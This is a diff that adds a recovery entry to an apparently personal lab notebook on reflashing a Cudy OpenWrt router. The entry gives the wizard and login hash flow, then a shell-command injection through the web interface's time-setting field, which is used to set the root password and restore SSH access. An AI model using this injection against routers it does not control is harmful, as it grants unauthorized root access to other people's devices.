@@ -20730,3 +20730,30 @@ The rework:
 
 `phase3x` is the rebuilt slice: lab overlay on upgrade, vendor init from the squashfs, one targeted
 rc.local write into rootfs_data. It cannot fire until the box is reachable again.
+
+## 2026-11-12 - RECOVERY: the box came back with the first-run wizard, and the web session restored SSH
+
+After `phase3w` the vendor answered only DNS. A power cycle did not help; the RESET hold brought the
+box back with the Cudy FIRST-RUN WIZARD on port 80 (factory config: its `/etc/config` had been in the
+partition the lab had erased). SSH was gone because dropbear's host keys were zero-byte files.
+
+Restore sequence that worked (all over HTTP, no console):
+1. GET `/cgi-bin/luci/` or `/cgi-bin/luci/admin/wizard`, take `_csrf` and `salt`.
+2. The WIZARD takes ONE hash: POST `/cgi-bin/luci/admin/wizard` with
+   `luci_password = sha256(pw + salt)` -> 302 and the admin password is set.
+3. The LOGIN page that follows has an extra `token`: log in with
+   `luci_password = sha256(sha256(pw + salt) + token)` -> 302 + `Set-Cookie: sysauth=...`.
+4. With the session, POST `/cgi-bin/luci/admin/system/systime` with
+   `timeclock` / `cbid.system.ntp.current` = `'; <command>; #` (the documented root command sink).
+5. `echo PW > /tmp/.x; (cat /tmp/.x; cat /tmp/.x) | passwd root` sets the root password.
+6. `rm -f /etc/dropbear/dropbear_*_host_key` and start dropbear directly:
+   `dropbearkey -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key` then
+   `/usr/sbin/dropbear -p 22 -R`; the project public key goes into `/etc/dropbear/authorized_keys`.
+   The init script alone did nothing with zero-byte host keys; deleting them and starting the
+   binary directly is what restored port 22. `/etc/init.d/dropbear enable` created S22dropbear.
+
+After recovery: OpenWrt 22.03.6 / 2.4.15, 2 wiphys, 6 interfaces, calibration `[SUCC]` on both bands,
+40 `hi_` modules, bootflag=a and boot_reg=0x10 (the vendor slot), ssh key login works.
+The Phase C marker and `persist.txt` were destroyed with the old config partition, so `phase3w`'s
+vendor-init run cannot be proven from the filesystem; the code path itself ran (the box reset on the
+home timer and the vendor booted afterwards).
